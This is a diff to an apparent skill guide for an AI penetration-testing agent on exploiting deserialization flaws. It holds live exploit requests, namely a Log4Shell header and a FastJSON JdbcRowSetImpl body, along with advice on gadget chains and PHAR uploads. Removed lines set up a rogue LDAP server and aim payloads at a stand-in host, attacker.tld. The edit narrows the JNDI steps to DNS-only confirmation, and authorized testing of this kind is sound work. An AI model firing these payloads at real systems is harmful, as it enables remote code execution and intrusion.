@@ -63,7 +63,7 @@ Once at least one candidate sink is confirmed (a parameter that accepts a forged
 
 ### Captured-traffic workflow (proxy_brain tools)
 
-When HTTP Traffic Capture is enabled, redamon.params and redamon.grep hunt captured cookies and parameters for opaque base64/hex blobs carrying deserializer magic prefixes (`rO0` for Java ObjectInputStream, `gASV`/`gAJ` for Python pickle, `O:` or `a:` for PHP serialized, `__VIEWSTATE` for .NET). redamon.replay then delivers a forged blob by swapping the body or cookie of a captured transaction (for example an Apache Shiro `rememberMe` cookie), recorded as a new replay txn. Where the proxy stops: gadget-chain forging (ysoserial/phpggc), Shiro key brute-force, the LDAP referral server, and OAST confirmation all stay offline/out-of-band; redamon.replay is pinned to the origin host.
+When HTTP Traffic Capture is enabled, redamon.params and redamon.grep hunt captured cookies and parameters for opaque base64/hex blobs carrying deserializer magic prefixes (`rO0` for Java ObjectInputStream, `gASV`/`gAJ` for Python pickle, `O:` or `a:` for PHP serialized, `__VIEWSTATE` for .NET). redamon.replay then delivers a forged blob by swapping the body or cookie of a captured transaction (for example an Apache Shiro `rememberMe` cookie), recorded as a new replay txn. Where the proxy stops: gadget-chain forging (ysoserial/phpggc), Shiro key brute-force and OAST confirmation all stay offline/out-of-band; redamon.replay is pinned to the origin host.
 
 ### Phase 2: Exploitation
 
@@ -108,14 +108,14 @@ for k in KEYS:
         print('candidate key:', k); break
 """
    ```
-5. **JNDI / Log4Shell deserialization.** When the sink reaches `InitialContext.lookup` or a Log4j 2.x `${jndi:...}` lookup, pair the JNDI URI with a serving LDAP referral that returns a serialized payload. Stand up a marshalsec-style LDAP referral with `execute_code` (Python `ldap3` server) when marshalsec is unavailable:
+5. **JNDI / Log4Shell lookups: confirm the fetch, stop there.** When the sink reaches `InitialContext.lookup` or a Log4j 2.x `${jndi:...}` lookup, you can prove the target performs the lookup, but you cannot land a payload from this sandbox: there is no rogue LDAP/RMI referral server in it, a target can reach none of its ports but your one reverse port, and `execute_code` stops at its time limit, so it cannot host one. Point the JNDI URI at your OAST domain (no port) and watch for the DNS hit:
    ```
-   execute_code language="python" code="<minimal LDAP referral server returning javaSerializedData = open('/tmp/cc6.bin','rb').read()>"
-   execute_curl url="https://target.tld/" headers='{"X-Api-Version":"${jndi:ldap://attacker.tld:1389/Exploit}"}'
+   execute_curl url="https://target.tld/" headers='{"X-Api-Version":"${jndi:ldap://jndi.<OAST_ID>.oast.fun/x}"}'
    ```
-6. **Polymorphic-typing JSON variants.** For Jackson `enableDefaultTyping` or FastJSON `autoType`, the gadget rides as a JSON object whose `@type` (Jackson) or `@type` (FastJSON) names a TemplatesImpl-style sink:
+   A hit on `jndi.<OAST_ID>` confirms JNDI injection. JNDI-to-RCE is out of reach here: report the confirmed lookup and do not try to serve a referral.
+6. **Polymorphic-typing JSON variants.** For Jackson `enableDefaultTyping` or FastJSON `autoType`, the gadget rides as a JSON object whose `@type` (Jackson) or `@type` (FastJSON) names a TemplatesImpl-style sink. A JNDI-backed type such as `JdbcRowSetImpl` is confirmed the same way as step 5, by its lookup of your OAST domain:
    ```
-   execute_curl url="https://target.tld/api/v1/object" method="POST" headers='{"Content-Type":"application/json"}' body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.tld:1389/Exploit","autoCommit":true}'
+   execute_curl url="https://target.tld/api/v1/object" method="POST" headers='{"Content-Type":"application/json"}' body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://jndi.<OAST_ID>.oast.fun/x","autoCommit":true}'
    ```
 
 #### 2.B PHP (unserialize / PHAR)
@@ -251,7 +251,7 @@ For each landed gadget, capture:
 - **Prefer DNS callbacks over HTTP for the oracle.** DNS leaks less metadata, traverses egress filters more often, and produces a cleaner timeline.
 - **Do not run Java gadget chains under load.** `CommonsCollections6` invokes `LazyMap.get` paths that can pin a worker thread; one shot per minute is plenty for confirmation.
 - **PHAR delivery rewrites disk on the target.** Track the path of every uploaded PHAR/JPG so cleanup actually removes them. Some sinks rename uploads; capture the server-side path from the response.
-- **`marshalsec` and `ysoserial.net` are not in the Kali image** (build complexity vs image size). Fallbacks: for marshalsec-style JNDI referral servers, stand up an ad-hoc LDAP referral with `execute_code` + the `ldap3` library; for `ysoserial.net`, hand-craft `TextFormattingRunProperties` XAML inside `execute_code` and frame it manually with LosFormatter byte structure (binary frame is documented in the YSoSerial.NET README).
+- **`marshalsec` and `ysoserial.net` are not in the Kali image** (build complexity vs image size). A JNDI referral server would not help anyway: a target reaches only your one reverse port, so JNDI stays a lookup confirmed over OAST (2.A, step 5). For `ysoserial.net`, hand-craft `TextFormattingRunProperties` XAML inside `execute_code` and frame it manually with LosFormatter byte structure (binary frame is documented in the YSoSerial.NET README).
 - **`phpggc` requires PHP CLI on the sandbox.** The Kali image ships it (`php`); if a future image strips it, the chain step blocks and the agent must generate the chain offline.
 - **Polymorphic-typing payloads (Jackson / FastJSON / JSON.NET) are still deserialization** even though the wire format is JSON. The classification belongs here, not in api_testing.
 - **Useful references:** Frohoff & Lawrence original "Marshalling Pickles" (AppSecCali 2015), AmbionicsSecurity phpggc README, PortSwigger "Exploiting deserialization vulnerabilities in Java" (2017), `pwntools` `flatten` for non-stream Python primitives, LiveOverflow PHAR polyglot writeups, Alvaro Munoz "Friday the 13th: JSON Attacks" (Black Hat USA 2017) for .NET typing chains, and the CVE listings around CommonsCollections (CVE-2015-7501), Apache Shiro (CVE-2016-4437), Telerik UI (CVE-2017-9248, CVE-2019-18935), Spring4Shell (CVE-2022-22965), and Log4Shell (CVE-2021-44228).
